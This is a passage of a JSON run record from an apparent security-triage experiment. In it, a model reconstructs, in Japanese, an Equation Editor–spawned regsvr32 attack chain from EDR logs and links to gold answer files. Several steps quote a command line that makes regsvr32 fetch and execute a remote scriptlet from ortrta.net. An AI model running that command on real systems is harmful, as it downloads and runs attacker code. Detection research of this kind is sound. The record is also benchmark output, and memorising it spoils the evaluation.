alert_id が未確定のままの項目がある。\",\n    \"file / registry / child process の直接証拠はこの統合結果には含まれていない。\",\n    \"同一の command line を持つ 2 本の regsvr32.exe 系列は、観測上は別 PID として分離されるが、親子・対象物の追加原行がないため内部の細部は限定的である。\"\n  ],\n  \"timeline_ja\": [\n    \"2022-07-19 14:33:24 regsvr32.exe (PID 6124) が EQNEDT32.EXE -Embedding を親として起動された。\",\n    \"2022-07-19 14:33:26 regsvr32.exe (PID 6124) が ortrta.net へ 10.193.66.115:8080 で通信した。\",\n    \"2022-07-19 14:33:42 regsvr32.exe (PID 6124) が ortrta.net へ 10.193.66.115:8080 で通信した。\",\n    \"2022-07-19 14:36:16 regsvr32.exe (PID 3992) が EQNEDT32.EXE -Embedding を親として起動された。\",\n    \"2022-07-19 14:36:21 regsvr32.exe (PID 3992) が ortrta.net へ 10.193.66.115:8080 で通信した。\"\n  ]\n}",
+      "usage_metadata": {
+        "input_tokens": 4432,
+        "output_tokens": 3292,
+        "total_tokens": 7724,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 0
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      }
+    }
+  ],
+  "output_text": "{\n  \"input_scope\": {\n    \"host\": \"WIN-32-H1\",\n    \"process\": \"regsvr32.exe\",\n    \"timestamp\": \"2022-07-19 14:33:24\",\n    \"condition\": \"stage3\",\n    \"input_fields_used\": [\n      \"host\",\n      \"process\",\n      \"timestamp\"\n    ]\n  },\n  \"code_steps\": [\n    {\n      \"step_id\": \"S1\",\n      \"order\": 1,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"起動された\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"command_line\",\n          \"value\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"msft-security\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"parent_command_line\",\n          \"value\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n          \"pid\": null,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"この行では event_record_id と PID/PPID の完全な原行確認が不足している。\",\n        \"parent_pid は観測要約からは確定できていない。\"\n      ]\n    },\n    {\n      \"step_id\": \"S2\",\n      \"order\": 2,\n      \"time\": \"2022-07-19 14:33:26\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"ネットワーク接続を行った\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:26\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:26\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:26\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"通信の具体的な原行 event_record_id は確認できていない。\"\n      ]\n    },\n    {\n      \"step_id\": \"S3\",\n      \"order\": 3,\n      \"time\": \"2022-07-19 14:33:42\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"ネットワーク接続を行った\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"通信の具体的な原行 event_record_id は確認できていない。\"\n      ]\n    },\n    {\n      \"step_id\": \"S4\",\n      \"order\": 4,\n      \"time\": \"2022-07-19 14:36:16\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 3992,\n        \"path\": null\n      },\n      \"operation\": \"起動された\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:36:16\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"command_line\",\n          \"value\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n          \"pid\": 3992,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"この行では event_record_id と親 PID の完全な原行確認が不足している。\"\n      ]\n    },\n    {\n      \"step_id\": \"S5\",\n      \"order\": 5,\n      \"time\": \"2022-07-19 14:36:21\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 3992,\n        \"path\": null\n      },\n      \"operation\": \"ネットワーク接続を行った\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:36:21\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 3992,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:36:21\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 3992,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:36:21\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 3992,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"通信の具体的な原行 event_record_id は確認できていない。\"\n      ]\n    }\n  ],\n  \"code_sequence\": [\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"\n  ],\n  \"supporting_alert_evidence\": [\n    {\n      \"alert_id\": null,\n      \"alert_name\": null,\n      \"source_stream\": \"cbc-edr-alerts\",\n      \"why_supporting_only\": \"CBC alert summary は補助証拠としてのみ扱い、command line や operation の根拠には使っていない。\"\n    }\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"escalate_alert\",\n    \"host_disposition\": \"escalate_host_investigation\",\n    \"evidence_basis\": [\n      \"regsvr32.exe が 2 回観測され、同一の command line を持つ別接続成分として記録された。\",\n      \"いずれも EQNEDT32.EXE -Embedding を親としていた。\",\n      \"ortrta.net への接続先が 10.193.66.115:8080 として 2 回観測された。\"\n    ]\n  },\n  \"excluded_nearby_evidence\": [\n    \"この応答では、regsvr32.exe に直接接続できることが確認できなかった近傍の別プロセス行は code_steps に統合していない。\",\n    \"event_record_id、alert_id、source_row_id の原値は、この要約に含められた観測行では確認できなかったため null のまま扱った。\"\n  ],\n  \"global_limitations\": [\n    \"提示された要約情報のみを用いて統合しているため、原始行の event_record_id や alert_id が未確定のままの項目がある。\",\n    \"file / registry / child process の直接証拠はこの統合結果には含まれていない。\",\n    \"同一の command line を持つ 2 本の regsvr32.exe 系列は、観測上は別 PID として分離されるが、親子・対象物の追加原行がないため内部の細部は限定的である。\"\n  ],\n  \"timeline_ja\": [\n    \"2022-07-19 14:33:24 regsvr32.exe (PID 6124) が EQNEDT32.EXE -Embedding を親として起動された。\",\n    \"2022-07-19 14:33:26 regsvr32.exe (PID 6124) が ortrta.net へ 10.193.66.115:8080 で通信した。\",\n    \"2022-07-19 14:33:42 regsvr32.exe (PID 6124) が ortrta.net へ 10.193.66.115:8080 で通信した。\",\n    \"2022-07-19 14:36:16 regsvr32.exe (PID 3992) が EQNEDT32.EXE -Embedding を親として起動された。\",\n    \"2022-07-19 14:36:21 regsvr32.exe (PID 3992) が ortrta.net へ 10.193.66.115:8080 で通信した。\"\n  ]\n}",
+  "usage": {
+    "input_tokens": 9630,
+    "output_tokens": 4329,
+    "cached_input_tokens": 0
+  },
+  "atlasv2_s3_s4_attack8_paired_experiment": {
+    "case_file": "data\\current_experiment\\cases\\atlasv2_s3_s4_attack8_neutral5_stage_cases_20260726.jsonl",
+    "chain_id": "s3_pt_02_regsvr32_remote_sct",
+    "stage": "stage3",
+    "gold": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\gold\\atlasv2_s3_s4_attack8_neutral5_gold_20260726\\by_chain\\s3_pt_02_regsvr32_remote_sct\\chain_gold.json",
+    "copied_from": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\runs\\clouseau_reconstruction_outputs\\20260726T055037Z_s3_pt_02_regsvr32_remote_sct_stage3_gpt-5.4-mini_official\\run.json"
+  }
+}
